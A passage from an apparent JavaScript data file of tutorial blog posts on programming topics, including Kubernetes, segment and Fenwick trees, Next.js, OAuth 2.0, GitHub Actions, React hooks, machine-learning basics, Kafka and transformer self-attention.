  "Kubernetes is complex. Do not use it for a simple blog or a monolith. Use it when you have a distributed microservices architecture that requires high availability."
</blockquote>
<p>To learn K8s locally, install <a href="https://minikube.sigs.k8s.io/docs/">Minikube</a> or use Docker Desktop's built-in Kubernetes cluster.</p>
    `
  },
  {
    title: "Segment Trees: Solving Range Query Problems",
    tags: ["segment-tree", "range-queries", "cp", "cplusplus-dsa", "advanced-ds"],
    content: `
<h2>The Problem with Arrays</h2>
<p>Imagine you have an array of 100,000 numbers. You need to perform two operations repeatedly:</p>
<ol>
  <li>Update the value at a specific index.</li>
  <li>Find the sum (or minimum, or maximum) of a range from index <code>L</code> to <code>R</code>.</li>
</ol>
<p>If you use a simple array, updating is <code>O(1)</code>, but finding the sum takes <code>O(N)</code>. If you do 100,000 queries, it takes <code>O(N^2)</code> time, resulting in TLE. A <strong>Segment Tree</strong> performs both operations in <code>O(log N)</code>!</p>
<hr>
<h3>How a Segment Tree Works</h3>
<p>A Segment Tree is a binary tree where the root represents the entire array range <code>[0, N-1]</code>. Each child splits the range in half. The leaves represent single elements.</p>
<h3>Building the Tree (C++)</h3>
<pre><code>const int MAXN = 100000;
int tree[4 * MAXN]; // Tree size must be 4*N
int arr[MAXN];

void build(int node, int start, int end) {
    if (start == end) {
        tree[node] = arr[start];
    } else {
        int mid = (start + end) / 2;
        // Recursively build left and right children
        build(2 * node, start, mid);
        build(2 * node + 1, mid + 1, end);
        // Internal node stores the sum of children
        tree[node] = tree[2 * node] + tree[2 * node + 1];
    }
}</code></pre>
<h3>Querying a Range</h3>
<p>To query a range <code>[L, R]</code>, we traverse the tree. If the node's range is completely inside <code>[L, R]</code>, we return its value. If it's completely outside, we return 0. If it partially overlaps, we split the query to its children.</p>
<pre><code>int query(int node, int start, int end, int L, int R) {
    if (R &lt; start || end &lt; L) return 0; // Outside range
    if (L &lt;= start &amp;&amp; end &lt;= R) return tree[node]; // Inside range
    
    int mid = (start + end) / 2;
    int p1 = query(2 * node, start, mid, L, R);
    int p2 = query(2 * node + 1, mid + 1, end, L, R);
    return p1 + p2;
}</code></pre>
<p>Segment trees are an absolute necessity for advanced competitive programming. They can be extended with <em>Lazy Propagation</em> to handle range updates (e.g., add X to all elements from L to R) in <code>O(log N)</code> time.</p>
    `
  },
  {
    title: "Next.js App Router: React Server Components Explained",
    tags: ["nextjs", "react-server-components", "ssr", "ssg", "web-perf"],
    content: `
<h2>The Paradigm Shift in React</h2>
<p>With Next.js version 13 and 14, Vercel introduced the <strong>App Router</strong>, fundamentally changing how we write React. The most significant change is the introduction of React Server Components (RSC).</p>
<hr>
<h3>Client vs Server Components</h3>
<p>Historically, React components ran in the browser. Next.js <em>pre-rendered</em> the HTML (SSR), but the JavaScript bundle still had to be downloaded and executed (hydrated) on the client.</p>
<p><strong>Server Components</strong> never ship JavaScript to the client. They execute entirely on the server, outputting pure HTML. By default, all components in the Next.js App Router are Server Components.</p>
<ul>
  <li><strong>Use Server Components for:</strong> Fetching data, accessing databases, keeping large dependencies on the server (e.g., heavy markdown parsers).</li>
  <li><strong>Use Client Components for:</strong> Interactivity (<code>useState</code>, <code>onClick</code>), browser APIs (<code>window</code>), and custom hooks. You declare these with the <code>"use client"</code> directive.</li>
</ul>
<h3>Fetching Data directly in Components</h3>
<p>Goodbye <code>getServerSideProps</code>! You can now use async/await directly inside your React components.</p>
<pre><code>// app/blog/page.tsx
import { db } from '@/lib/db';

// This component runs on the server. No JS is sent to the browser!
export default async function BlogPage() {
  const posts = await db.post.findMany(); // Direct DB query!

  return (
    &lt;main&gt;
      &lt;h1&gt;Latest Posts&lt;/h1&gt;
      &lt;ul&gt;
        {posts.map(post =&gt; (
          &lt;li key={post.id}&gt;{post.title}&lt;/li&gt;
        ))}
      &lt;/ul&gt;
    &lt;/main&gt;
  );
}</code></pre>
<h3>Server Actions for Mutations</h3>
<p>Next.js 14 also stabilized Server Actions. You can write a function that executes on the server and call it directly from a client-side form submission, eliminating the need to write separate API routes for simple CRUD operations.</p>
<blockquote>
  "The App Router has a steep learning curve, but it results in dramatically smaller JavaScript bundles, leading to vastly improved Core Web Vitals and SEO."
</blockquote>
    `
  },
  {
    title: "Demystifying OAuth 2.0 and OpenID Connect",
    tags: ["oauth", "security", "authentication", "authorization", "identity"],
    content: `
<h2>Login with Google, Explained</h2>
<p>Every time you click a "Sign in with GitHub" or "Login with Google" button, you are utilizing OAuth 2.0 and OpenID Connect (OIDC). Understanding how these protocols work is vital for backend security.</p>
<hr>
<h3>Authentication vs Authorization</h3>
<p>This is the most common point of confusion:</p>
<ul>
  <li><strong>Authentication (AuthN):</strong> Verifying <em>who</em> you are (OpenID Connect).</li>
  <li><strong>Authorization (AuthZ):</strong> Verifying <em>what</em> you have access to (OAuth 2.0).</li>
</ul>
<h3>The Authorization Code Flow</h3>
<p>This is the most secure and common flow used by web applications.</p>
<ol>
  <li><strong>The Request:</strong> The user clicks "Login". Your app redirects them to the Identity Provider (IdP) like Google, passing your <code>client_id</code> and requested <code>scopes</code>.</li>
  <li><strong>Consent:</strong> The user logs into Google and sees a prompt: "App X wants to access your email". They click Accept.</li>
  <li><strong>The Code:</strong> Google redirects the user back to your app's callback URL, appending a temporary <code>?code=XYZ</code> to the URL.</li>
  <li><strong>The Exchange:</strong> Your backend server takes this <code>code</code>, attaches its secret <code>client_secret</code>, and makes a secure server-to-server POST request to Google.</li>
  <li><strong>The Tokens:</strong> Google validates the request and responds with an <strong>Access Token</strong> (for APIs) and an <strong>ID Token</strong> (user profile data).</li>
</ol>
<h3>ID Tokens vs Access Tokens</h3>
<p>The <strong>ID Token</strong> is a JWT (JSON Web Token) that your application can decode to get the user's name, email, and profile picture. It is for <em>your app</em> to read.</p>
<pre><code>// Example decoded ID Token Payload
{
  "iss": "https://accounts.google.com",
  "sub": "1234567890",
  "email": "user@example.com",
  "name": "Jane Doe",
  "exp": 1600000000
}</code></pre>
<p>The <strong>Access Token</strong> is an opaque string used to access the IdP's APIs (e.g., reading the user's Google Drive files). You send this in the <code>Authorization: Bearer</code> header.</p>
<p>Never pass the <code>client_secret</code> to the frontend frontend, and always validate the <code>state</code> parameter to prevent CSRF attacks!</p>
    `
  },
  {
    title: "Design Patterns: Implementing the Observer Pattern in TypeScript",
    tags: ["design-patterns", "typescript", "oop", "architecture", "software-engineering"],
    content: `
<h2>Decoupling Your Architecture</h2>
<p>Design patterns are proven solutions to common software engineering problems. The <strong>Observer Pattern</strong> is a behavioral design pattern that defines a one-to-many dependency between objects. When the subject changes state, all its dependents (observers) are notified.</p>
<hr>
<h3>The Concept: Pub/Sub</h3>
<p>Think of YouTube. A Channel is the <strong>Subject</strong>. Subscribers are the <strong>Observers</strong>. When the Channel uploads a video, all Subscribers receive a notification. The Channel doesn't need to know the specific details of every subscriber, just that they implement a notification interface.</p>
<h3>TypeScript Implementation</h3>
<pre><code>// 1. Define the Observer Interface
interface Observer {
    update(temperature: number): void;
}

// 2. Define the Subject Interface
interface Subject {
    attach(o: Observer): void;
    detach(o: Observer): void;
    notify(): void;
}

// 3. Concrete Subject
class WeatherStation implements Subject {
    private observers: Observer[] = [];
    private temperature: number = 0;

    attach(o: Observer) {
        this.observers.push(o);
    }

    detach(o: Observer) {
        this.observers = this.observers.filter(obs =&gt; obs !== o);
    }

    notify() {
        for (let observer of this.observers) {
            observer.update(this.temperature);
        }
    }

    setTemperature(temp: number) {
        console.log(\`WeatherStation: New temp is \${temp}\`);
        this.temperature = temp;
        this.notify();
    }
}</code></pre>
<h3>Creating the Observers</h3>
<pre><code>class PhoneDisplay implements Observer {
    update(temp: number) {
        console.log(\`Phone Display: Temperature updated to \${temp} degrees.\`);
    }
}

class WindowDisplay implements Observer {
    update(temp: number) {
        console.log(\`Window Display: It is currently \${temp} outside.\`);
    }
}

// Usage:
const station = new WeatherStation();
const phone = new PhoneDisplay();
const window = new WindowDisplay();

station.attach(phone);
station.attach(window);

station.setTemperature(25); 
// Output: Phone Display updated... Window Display updated...</code></pre>
<blockquote>
  "The Observer pattern is heavily used in modern frameworks. Redux, React's Context API, and RxJS Observables are all sophisticated implementations of this concept."
</blockquote>
    `
  },
  {
    title: "CI/CD Pipelines: Automating Deployments with GitHub Actions",
    tags: ["cicd", "github-actions", "automation", "testing", "dev-tools"],
    content: `
<h2>Stop Deploying Manually</h2>
<p>If you are still FTP-ing files to your server or manually running <code>npm run build</code> and dragging folders around, you are wasting time and risking human error. <strong>Continuous Integration and Continuous Deployment (CI/CD)</strong> automates this pipeline.</p>
<hr>
<h3>What is GitHub Actions?</h3>
<p>GitHub Actions allows you to automate your software workflows directly within your GitHub repository. You define a workflow using a YAML file in the <code>.github/workflows/</code> directory.</p>
<h3>Core Concepts</h3>
<ul>
  <li><strong>Workflow:</strong> An automated process made of one or more jobs.</li>
  <li><strong>Events:</strong> Triggers that run the workflow (e.g., <code>push</code>, <code>pull_request</code>).</li>
  <li><strong>Runners:</strong> The server that runs your workflow (GitHub provides free Linux, Windows, and macOS virtual machines).</li>
  <li><strong>Steps:</strong> Individual tasks that run commands or actions.</li>
</ul>
<h3>Example: Build and Test a Node.js App</h3>
<p>Here is a basic workflow that runs your tests every time someone pushes to the <code>main</code> branch.</p>
<pre><code>name: Node.js CI

on:
  push:
    branches: [ "main" ]
  pull_request:
    branches: [ "main" ]

jobs:
  build-and-test:
    runs-on: ubuntu-latest

    steps:
    - name: Checkout repository
      uses: actions/checkout@v3

    - name: Setup Node.js 18
      uses: actions/setup-node@v3
      with:
        node-version: '18'
        cache: 'npm'

    - name: Install dependencies
      run: npm ci

    - name: Run linter
      run: npm run lint

    - name: Run tests
      run: npm test</code></pre>
<h3>Deploying (Continuous Deployment)</h3>
<p>You can add another job that only runs if the tests pass. You can securely store your SSH keys or Cloud Provider credentials in <strong>GitHub Secrets</strong>.</p>
<pre><code>    - name: Deploy to Production
      if: github.ref == 'refs/heads/main'
      env:
        DEPLOY_TOKEN: \${{ secrets.RENDER_DEPLOY_HOOK }}
      run: |
        curl -X POST $DEPLOY_TOKEN</code></pre>
<p>Setting up CI/CD is the hallmark of a mature engineering team. It builds confidence, allowing you to merge code knowing that if the tests pass, the build will not break production.</p>
    `
  },
  {
    title: "Advanced React: Building a Bulletproof useFetch Custom Hook",
    tags: ["react-hooks", "frontend-architecture", "javascript-patterns", "web-performance", "custom-hooks"],
    content: `
<h2>The Problem with Standard Fetching</h2>
<p>Every React developer eventually writes a component that fetches data when it mounts. Usually, this involves a <code>useEffect</code>, a couple of <code>useState</code> calls for data, loading, and error states. But doing this in every component violates the DRY (Don't Repeat Yourself) principle and often introduces subtle bugs like memory leaks.</p>
<hr>
<h3>Why We Need Custom Hooks</h3>
<p>Custom hooks allow us to extract component logic into reusable functions. A robust <code>useFetch</code> hook should handle:</p>
<ul>
  <li><strong>Loading States:</strong> Knowing exactly when the request is in flight.</li>
  <li><strong>Error Handling:</strong> Catching both network errors and HTTP errors.</li>
  <li><strong>Request Cancellation:</strong> Aborting the fetch if the component unmounts before the request completes to prevent the dreaded <s>"Can't perform a React state update on an unmounted component"</s> warning.</li>
  <li><strong>Caching:</strong> Storing responses so we don't refetch unnecessarily.</li>
</ul>
<blockquote>
  "The true power of React Hooks lies in their ability to compose stateful logic. By abstracting data fetching, your UI components become purely presentational."
</blockquote>
<h3>Building the Hook</h3>
<p>Here is an extra-large, production-ready implementation using the <strong>AbortController</strong> API for cleanup.</p>
<pre><code>import { useState, useEffect, useRef } from 'react';

export function useFetch(url, options = {}) {
  const [data, setData] = useState(null);
  const [error, setError] = useState(null);
  const [isLoading, setIsLoading] = useState(true);
  
  // Use a ref to store the cache so it persists across renders without triggering them
  const cache = useRef({});

  useEffect(() =&gt; {
    if (!url) return;
    
    let isMounted = true;
    const abortController = new AbortController();
    const { signal } = abortController;

    const fetchData = async () =&gt; {
      setIsLoading(true);
      setError(null);

      if (cache.current[url]) {
        setData(cache.current[url]);
        setIsLoading(false);
        return;
      }

      try {
        const response = await fetch(url, { ...options, signal });
        
        if (!response.ok) {
          throw new Error(\`HTTP error! status: \${response.status}\`);
        }
        
        const result = await response.json();
        
        if (isMounted) {
          cache.current[url] = result; // Update cache
          setData(result);
        }
      } catch (err) {
        if (isMounted &amp;&amp; err.name !== 'AbortError') {
          setError(err.message);
        }
      } finally {
        if (isMounted) setIsLoading(false);
      }
    };

    fetchData();

    // Cleanup function: abort fetch and prevent state updates if unmounted
    return () =&gt; {
      isMounted = false;
      abortController.abort();
    };
  }, [url]); // Only re-run if URL changes

  return { data, error, isLoading };
}</code></pre>
<h3>How to Consume It</h3>
<p>Your component now becomes incredibly clean. All the messy imperative logic is hidden away.</p>
<pre><code>function UserProfile({ userId }) {
  const { data, error, isLoading } = useFetch(\`https://api.example.com/users/\${userId}\`);

  if (isLoading) return &lt;p&gt;Loading user details...&lt;/p&gt;;
  if (error) return &lt;p&gt;Error: {error}&lt;/p&gt;;
  if (!data) return null;

  return (
    &lt;div&gt;
      &lt;h1&gt;{data.name}&lt;/h1&gt;
      &lt;p&gt;{data.email}&lt;/p&gt;
    &lt;/div&gt;
  );
}</code></pre>
<p>To take this to the absolute next level in a real application, you should strongly consider using libraries like <a href="https://tanstack.com/query/latest">TanStack Query (React Query)</a> or SWR, which provide this exact functionality but with global caching, background refetching, and pagination built-in!</p>
    `
  },
  {
    title: "JavaScript Engine Internals: The Call Stack and Memory Heap",
    tags: ["javascript-engine", "event-loop", "v8", "async-programming", "nodejs-internals"],
    content: `
<h2>Looking Under the Hood of V8</h2>
<p>We write JavaScript every day, but how does the computer actually execute it? Browsers and Node.js use JavaScript engines (like Google's V8, Mozilla's SpiderMonkey, or Apple's JavaScriptCore) to translate our high-level code into machine code. Let's explore the two most critical components: the <strong>Memory Heap</strong> and the <strong>Call Stack</strong>.</p>
<hr>
<h3>The Memory Heap: Where Data Lives</h3>
<p>The memory heap is a large, mostly unstructured region of memory. When you define a complex data structure like an object or an array, the JS engine allocates space for it here.</p>
<ul>
  <li><strong>Primitive Types:</strong> Numbers, booleans, and strings are mostly stored directly on the call stack (or in registers) because their size is fixed.</li>
  <li><strong>Reference Types:</strong> Objects, arrays, and functions are stored in the heap. The variable on the call stack merely holds a <em>reference</em> (a memory address) pointing to the heap.</li>
</ul>
<p><em>Fun Fact:</em> This is why two identical objects do not equal each other (<code>{} === {}</code> is <code>false</code>). You are comparing their memory addresses, not their contents!</p>
<h3>The Call Stack: Where Code Executes</h3>
<p>JavaScript is a single-threaded language, meaning it has exactly one Call Stack. It can only do one thing at a time. The Call Stack records where we are in the program using a "Last-In, First-Out" (LIFO) data structure.</p>
<blockquote>
  "If you step into a function, you push it onto the stack. If you return from a function, you pop it off the stack. That is all the stack can do."
</blockquote>
<h3>Visualizing a Stack Overflow</h3>
<p>What happens if you write a recursive function without a base case? The engine keeps pushing function calls onto the stack until it runs out of memory.</p>
<pre><code>function inception() {
  // No base case!
  inception();
}

inception(); // Throws: Uncaught RangeError: Maximum call stack size exceeded</code></pre>
<h3>Garbage Collection: Mark and Sweep</h3>
<p>Unlike C or C++, JavaScript automatically manages memory. But how does it know when to free up space in the heap? V8 uses a <strong>Mark and Sweep</strong> algorithm.</p>
<ol>
  <li><strong>Mark:</strong> The garbage collector starts at the "roots" (the global object and current call stack). It traverses all references, "marking" every object it can reach as active.</li>
  <li><strong>Sweep:</strong> Any object in the heap that was <s>not marked</s> is considered unreachable garbage. The engine sweeps it away, freeing the memory.</li>
</ol>
<p>Understanding these internals makes you a better developer. You start to see why global variables are bad (they act as roots and are never garbage collected), and why deep recursion can crash your application. For a deep dive, check out the <a href="https://v8.dev/blog">official V8 engine blog</a>.</p>
    `
  },
  {
    title: "DSA Masterclass: Fenwick Trees (Binary Indexed Trees)",
    tags: ["fenwick-tree", "binary-indexed-tree", "range-queries", "cp", "advanced-dsa"],
    content: `
<h2>The Elegance of the Fenwick Tree</h2>
<p>When dealing with array range queries (like finding the sum from index L to R) alongside point updates (changing the value at index I), a Segment Tree is the standard solution. However, a <strong>Fenwick Tree</strong>, also known as a Binary Indexed Tree (BIT), achieves the exact same <code>O(log N)</code> time complexity with vastly less code and lower memory overhead.</p>
<hr>
<h3>The Bitwise Magic</h3>
<p>The entire concept of a Fenwick Tree relies on the binary representation of indices. Every number can be represented as a sum of powers of 2. Similarly, a Fenwick Tree decomposes the prefix sum of an array into non-overlapping sub-ranges based on the set bits of the index.</p>
<p>The core operation relies on isolating the <em>least significant bit (LSB)</em>. We can do this using the two's complement bitwise trick: <code>i &amp; (-i)</code>.</p>
<blockquote>
  "The Fenwick tree represents an array of size N as a tree implicitly stored in an array, where the parent-child relationships are governed strictly by bitwise operations."
</blockquote>
<h3>C++ Implementation</h3>
<p>Notice how incredibly short the code is compared to a Segment Tree. This is why competitive programmers love it.</p>
<pre><code>#include &lt;vector&gt;
using namespace std;

class FenwickTree {
private:
    vector&lt;int&gt; bit; // binary indexed tree
    int n;

public:
    // Initialize the tree with size n + 1 (1-based indexing is required)
    FenwickTree(int n) {
        this-&gt;n = n;
        bit.assign(n + 1, 0);
    }

    // Add 'val' to element at index 'idx' (1-based)
    void add(int idx, int val) {
        // To update, we ADD the LSB to move up the tree
        for (; idx &lt;= n; idx += idx &amp; -idx) {
            bit[idx] += val;
        }
    }

    // Get prefix sum from 1 to idx
    int query(int idx) {
        int sum = 0;
        // To query, we SUBTRACT the LSB to move down the tree
        for (; idx &gt; 0; idx -= idx &amp; -idx) {
            sum += bit[idx];
        }
        return sum;
    }

    // Get sum of range [L, R]
    int queryRange(int L, int R) {
        return query(R) - query(L - 1);
    }
};</code></pre>
<h3>When to Use What?</h3>
<ul>
  <li><strong>Use Fenwick Trees for:</strong> Prefix sums, prefix XORs, counting inversions in an array, and simple range queries. It requires only <code>O(N)</code> space.</li>
  <li><strong>Use Segment Trees for:</strong> Range Minimum/Maximum Queries (RMQ), range updates (via lazy propagation), and complex custom combining logic.</li>
</ul>
<p>If you want to practice, try solving the classic "Count Inversions" problem using a Fenwick Tree. It is a fantastic exercise in combining sorting with bitwise data structures. You can find excellent tutorials on <a href="https://cp-algorithms.com/data_structures/fenwick.html">CP-Algorithms</a>.</p>
    `
  },
  {
    title: "Foundations of Machine Learning: Linear Regression and Gradient Descent",
    tags: ["machine-learning", "math", "algorithms", "python", "data-science"],
    content: `
<h2>The Starting Point of Predictive Modeling</h2>
<p>Linear Regression is often the very first algorithm a data scientist learns. At its core, it is a method to model the relationship between a dependent scalar variable and one or more explanatory variables by fitting a linear equation to observed data.</p>
<hr>
<h3>The Linear Equation</h3>
<p>In simple linear regression with a single feature, the model predicts the target using the formula:</p>
<blockquote>
  "y = m * x + c"
</blockquote>
<p>Where <code>m</code> is the slope (weight) and <code>c</code> is the intercept (bias). The goal of training is to find the optimal values for <code>m</code> and <code>c</code> that minimize the error between predictions and actual values.</p>
<h3>Optimizing with Gradient Descent</h3>
<p>To minimize the Mean Squared Error (MSE) loss function, we use <strong>Gradient Descent</strong>. This optimization algorithm iteratively steps in the direction of steepest descent to find the local minimum of the error surface.</p>
<pre><code>import numpy as np

def gradient_descent(X, y, lr=0.01, iterations=1000):
    m, c = 0.0, 0.0
    n = len(X)
    
    for _ in range(iterations):
        y_pred = m * X + c
        
        # Calculate gradients
        dm = (-2/n) * sum(X * (y - y_pred))
        dc = (-2/n) * sum(y - y_pred)
        
        # Update weights
        m -= lr * dm
        c -= lr * dc
        
    return m, c</code></pre>
<h3>Key Performance Tuning</h3>
<ul>
  <li><strong>Learning Rate (lr):</strong> If it is too large, the algorithm might overshoot the minimum. If it is too small, convergence takes <s>forever</s> too many iterations.</li>
  <li><strong>Feature Scaling:</strong> Gradient descent converges much faster if features are standardized to have a mean of 0 and variance of 1.</li>
</ul>
    `
  },
  {
    title: "Data Science Essentials: Precision, Recall, and the F1-Score",
    tags: ["data-science", "statistics", "machine-learning", "model-evaluation"],
    content: `
<h2>Beyond Simple Accuracy</h2>
<p>When evaluating a classification model, beginners often rely entirely on <strong>Accuracy</strong> (the ratio of correct predictions to total predictions). However, accuracy can be a dangerously misleading metric when dealing with imbalanced datasets.</p>
<hr>
<h3>The Imbalance Trap</h3>
<p>Imagine a fraud detection model where only 1% of transactions are actually fraudulent. A naive model that blindly predicts "Not Fraud" for every transaction achieves <strong>99% accuracy</strong> while being completely useless. To solve this, data scientists use the Confusion Matrix metrics.</p>
<h3>Core Evaluation Metrics</h3>
<ol>
  <li><strong>Precision:</strong> Out of all predicted positive cases, how many were actually positive? (Crucial when False Positives are expensive, like spam filters).</li>
  <li><strong>Recall (Sensitivity):</strong> Out of all actual positive cases, how many did the model correctly identify? (Crucial when False Negatives are dangerous, like cancer detection).</li>
  <li><strong>F1-Score:</strong> The harmonic mean of Precision and Recall, providing a single balanced metric for imbalanced classes.</li>
</ol>
<h3>Implementation in Python</h3>
<pre><code>from sklearn.metrics import classification_report, confusion_matrix

y_true = [0, 1, 0, 0, 1, 0, 1, 0, 0, 0]
y_pred = [0, 1, 0, 0, 0, 0, 1, 1, 0, 0]

print("Confusion Matrix:")
print(confusion_matrix(y_true, y_pred))

print("\nDetailed Report:")
print(classification_report(y_true, y_pred))</code></pre>
<blockquote>
  "The F1-Score penalizes extreme values. A model with 1.0 precision and 0.0 recall will have an F1-Score of 0, whereas standard mathematical average would give 0.5."
</blockquote>
    `
  },
  {
    title: "Introduction to NLP: Tokenization and Word Embeddings",
    tags: ["nlp", "machine-learning", "ai", "text-processing", "python"],
    content: `
<h2>Teaching Machines to Read</h2>
<p>Computers are native calculators; they do not understand vowels, consonants, or grammar. To process text for Natural Language Processing (NLP) or Large Language Models (LLMs), text must be converted into structured mathematical representations.</p>
<hr>
<h3>Step 1: Tokenization</h3>
<p>Tokenization is the process of breaking text down into smaller, manageable pieces called <strong>Tokens</strong>. These can be words, characters, or subwords (like WordPiece or Byte-Pair Encoding used in modern transformers).</p>
<h3>Step 2: Word Embeddings</h3>
<p>Once tokenized, tokens are mapped to dense vector spaces. Algorithms like Word2Vec and GloVe ensure that words with similar structural contexts or semantic meanings end up near each other in geometric space.</p>
<pre><code># Vector representation concept (Semantic Arithmetic)
# King - Man + Woman = Queen
king = [0.25, 0.81, -0.11]
man = [0.10, 0.45, -0.05]
woman = [0.12, 0.33, 0.78]

# Resulting vector will map very closely to the token 'queen'
result = np.array(king) - np.array(man) + np.array(woman)</code></pre>
<h3>Modern Contextual Embeddings</h3>
<p>Static embedding systems like Word2Vec had a massive flaw: the word "bank" had the same vector representation whether it meant a financial institution or the side of a river. Modern AI leverages deep transformers to compute <em>contextual embeddings</em> dynamically based on neighboring text blocks.</p>
    `
  },
  {
    title: "Unsupervised Learning: How K-Means Clustering Works",
    tags: ["machine-learning", "unsupervised-learning", "clustering", "algorithms", "scikit-learn"],
    content: `
<h2>Finding Patterns Without Labels</h2>
<p>Most famous machine learning models use supervised learning, where the data includes an explicit answer sheet. But in the real world, data is often raw and unlabeled. <strong>K-Means Clustering</strong> is an unsupervised algorithm designed to partition data points into distinct, non-overlapping subgroups.</p>
<hr>
<h3>The Algorithm Step-by-Step</h3>
<p>The mechanics of K-Means rely on calculating distances (typically Euclidean distance) iteratively:</p>
<ol>
  <li>Specify the number of clusters <code>K</code> you want to discover.</li>
  <li>Randomly initialize <code>K</code> points on the feature landscape called <strong>Centroids</strong>.</li>
  <li>Assign each data point to its nearest centroid.</li>
  <li>Recompute the centroid coordinates by taking the average of all points assigned to that cluster.</li>
  <li>Repeat steps 3 and 4 until the centroids stabilize and stop shifting.</li>
</ol>
<h3>The Code in Practice</h3>
<pre><code>from sklearn.cluster import KMeans
import numpy as np

# Sample customer behavior data: [Age, Spending Score]
X = np.array([[25, 80], [22, 90], [45, 20], [50, 15], [28, 75], [48, 30]])

# Initialize with 2 targeted clusters
kmeans = KMeans(n_clusters=2, random_state=42, n_init="auto")
kmeans.fit(X)

print("Cluster assignments:", kmeans.labels_)
print("Final centroid locations:\n", kmeans.cluster_centers_)</code></pre>
<blockquote>
  "Choosing the perfect 'K' can be tricky. Data scientists evaluate internal variation metrics using the Elbow Method or Silhouette Analysis to pinpoint the optimal cluster count."
</blockquote>
    `
  },
  {
    title: "Deep Learning Foundations: The Role of Activation Functions",
    tags: ["deep-learning", "neural-networks", "ai", "math", "pytorch"],
    content: `
<h2>Introducing Non-Linearity into Neural Webs</h2>
<p>A deep neural network is essentially millions of matrix multiplications stacked on top of one another. However, stacking linear layers without an <strong>Activation Function</strong> results in a model that behaves exactly like a single, basic linear transformation. Activation functions inject non-linearity, allowing nets to learn highly intricate boundaries.</p>
<hr>
<h3>The Big Three Functions</h3>
<p>Different layers within a model leverage different mathematical profiles to handle features safely:</p>
<ul>
  <li><strong>Sigmoid:</strong> Compresses any input value into a strict range between 0 and 1. Perfect for final binary classification targets.</li>
  <li><strong>ReLU (Rectified Linear Unit):</strong> Replaces all negative input values with 0, leaving positive values untouched. It is the gold standard for hidden layers because it prevents vanishing gradients.</li>
  <li><strong>Softmax:</strong> Converts an array of scores into a probability distribution that sums exactly to 1.0, ideal for multi-class problem layers.</li>
</ul>
<h3>PyTorch Verification Snippet</h3>
<pre><code>import torch
import torch.nn as nn

# Mock raw output values (logits) from a final model layer
logits = torch.tensor([[2.0, 1.0, 0.1]])

# Pass through Softmax to calculate confidence percentages
softmax = nn.Softmax(dim=1)
probabilities = softmax(logits)

print("Model Confidence Distribution:", probabilities)
# Output components sum up exactly to 1.0</code></pre>
<p>Selecting the wrong activation function can cause networks to stall completely during optimization, a frustrating phenomenon famously known as the <em>Dying ReLU</em> bug.</p>
    `
  },
  {
    title: "System Design: Demystifying Distributed Message Queues (Kafka)",
    tags: ["apache-kafka", "message-queues", "distributed-systems", "event-driven", "backend-architecture"],
    content: `
<h2>The Backbone of Microservices</h2>
<p>In modern microservice architectures, having services talk directly to each other via synchronous HTTP (REST/gRPC) can lead to a tightly coupled, brittle system. If the Notification Service goes down, the Order Service hangs. The solution? <strong>Event-Driven Architecture</strong> using Distributed Message Queues.</p>
<hr>
<h3>Why Apache Kafka?</h3>
<p>While RabbitMQ and ActiveMQ are traditional message brokers that push messages to consumers and delete them once read, <strong>Apache Kafka</strong> is fundamentally different. It is a distributed commit log.</p>
<ul>
  <li><strong>Persistence:</strong> Kafka stores messages on disk. They aren't deleted after being consumed (until a retention period expires).</li>
  <li><strong>Replayability:</strong> Because messages are persisted, a new service can start from "day zero" and replay all historical events.</li>
  <li><strong>Throughput:</strong> Kafka can handle millions of messages per second by relying heavily on OS page caches and sequential disk I/O.</li>
</ul>
<blockquote>
  "Kafka doesn't push messages. Consumers <em>pull</em> messages from Kafka, keeping track of their own 'offset' (the index of the last read message)."
</blockquote>
<h3>Core Architecture Concepts</h3>
<ol>
  <li><strong>Producers:</strong> Applications that publish data to Kafka.</li>
  <li><strong>Topics:</strong> Logical channels where messages are categorized (e.g., <code>user_clicks</code> or <code>payment_processed</code>).</li>
  <li><strong>Partitions:</strong> To scale, a Topic is split into multiple Partitions spread across different server nodes (Brokers). This allows Kafka to parallelize data writing and reading.</li>
  <li><strong>Consumers &amp; Consumer Groups:</strong> Applications that read data. If you have 3 consumers in a group and 3 partitions, each consumer reads from exactly one partition, sharing the load perfectly.</li>
</ol>
<h3>A NodeJS Producer Example</h3>
<p>Using the <code>kafkajs</code> library, publishing an event is straightforward.</p>
<pre><code>const { Kafka } = require('kafkajs');

const kafka = new Kafka({
  clientId: 'order-service',
  brokers: ['kafka-broker1:9092', 'kafka-broker2:9092']
});

const producer = kafka.producer();

async function publishOrderCompleted(orderId, userId) {
  await producer.connect();
  
  await producer.send({
    topic: 'orders_completed',
    messages: [
      { 
        key: String(userId), // Key ensures all orders for a user go to the SAME partition
        value: JSON.stringify({ orderId, status: 'SUCCESS', timestamp: Date.now() }) 
      },
    ],
  });
  
  await producer.disconnect();
}</code></pre>
<h3>The Importance of the Partition Key</h3>
<p>In the code above, we use the <code>userId</code> as the message <code>key</code>. Kafka guarantees that <s>order matters globally</s> <strong>order is only guaranteed within a specific partition</strong>. By hashing the <code>userId</code> to a partition, we ensure that all events for a specific user are processed in the exact order they occurred. This prevents a "User Deleted" event from being processed before a "User Created" event!</p>
<p>To dive deeper into distributed systems, read the <a href="https://kafka.apache.org/documentation/">official Kafka documentation</a>.</p>
    `
  },
  {
    title: "AI/ML Deep Dive: The Self-Attention Mechanism in Transformers",
    tags: ["transformers", "nlp", "self-attention", "deep-learning", "pytorch"],
    content: `
<h2>Attention Is All You Need</h2>
<p>In 2017, Google researchers published a paper titled "Attention Is All You Need", introducing the <strong>Transformer</strong> architecture. It completely overthrew Recurrent Neural Networks (RNNs) and LSTMs, paving the way for LLMs like GPT-4, BERT, and Claude. But what exactly makes it so powerful?</p>
<hr>
<h3>The Problem with RNNs</h3>
<p>RNNs process text sequentially, one word at a time. This has two massive flaws:</p>
<ol>
  <li><strong>Vanishing Gradients:</strong> They "forget" information from the beginning of a long paragraph.</li>
  <li><strong>No Parallelization:</strong> Because they run sequentially, you cannot train them efficiently on modern GPUs.</li>
</ol>
<h3>Enter Self-Attention</h3>
<p>The Transformer processes the <em>entire</em> sentence at once. To understand context, it uses the <strong>Self-Attention mechanism</strong>. It allows the model to look at every other word in the sentence to understand the current word's meaning.</p>
<p>For example, in the sentence: <em>"The bank of the river was steep, so I couldn't sit by the bank."</em> The word "bank" means two different things. Self-attention mathematically connects the first "bank" to "river" and "steep", creating a rich, context-aware vector representation.</p>
<blockquote>
  "Self-attention calculates a weighted average of all other words in the sequence, where the weights represent the relevance of those words to the current word."
</blockquote>
<h3>The Q, K, V Matrices</h3>
<p>Self-attention uses three abstract concepts borrowed from database retrieval: <strong>Queries (Q), Keys (K), and Values (V)</strong>.</p>
<ul>
  <li><strong>Query:</strong> What I am looking for (the current word).</li>
